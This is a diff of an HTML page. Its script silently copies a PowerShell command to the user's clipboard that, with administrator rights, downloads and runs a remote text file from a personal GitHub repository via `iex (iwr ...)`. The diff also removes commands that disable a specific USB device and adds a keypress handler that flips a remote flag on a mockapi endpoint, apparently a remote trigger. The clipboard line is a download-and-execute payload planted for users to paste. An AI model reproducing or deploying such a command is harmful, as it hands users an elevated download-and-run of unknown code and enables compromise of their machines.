@@ -25,11 +25,7 @@
 </head>
 
 <body>
-    <h1>Disable-PnpDevice -InstanceId 'USB\VID_0951&PID_1666\0C9D9210E3AEE371498F0008' -Confirm:$false</h1>
-    <h1>powershell -Command "Start-Process powershell -ArgumentList '-c \"Disable-PnpDevice -InstanceId \\\"USB\VID_0951&PID_1666\0C9D9210E3AEE371498F0008\\\" -Confirm:$false\"' -Verb RunAs"</h1>
     <p id="req"></p>
-    
-
     <div id="copyIcon"></div>
     <script>
         function copyText(text) {
@@ -46,35 +42,25 @@
             copyText(`powershell -Command "Start-Process powershell -ArgumentList '-c iex (iwr \\"https://raw.githubusercontent.com/nguyenduyhuydn1/hello/refs/heads/main/1.txt\\")' -Verb RunAs"`);
         });
 
-
-
-        const urlObj = new URL(window.location.href);
-        const params = new URLSearchParams(urlObj.search);
-        const paramsObj = {};
-        params.forEach((value, key) => {
-            paramsObj[key] = value;
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'p' || event.key === 'P') {
+                fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ on: true })
+                }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
+            }else{
+                fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ on: false })
+                }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)   
+            }
         });
-
-
-
-        if (paramsObj.hasOwnProperty("r")) {
-            fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
-                method: 'PUT',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ on: true })
-            }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
-        }
-        else{
-            fetch("https://664aa391a300e8795d427b86.mockapi.io/temp/1", {
-                method: 'PUT',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ on: false })
-            }).then(v=> v.json()).then(data =>  document.querySelector('#req').textContent = data.on)
-        }
     </script>
 </body>
 
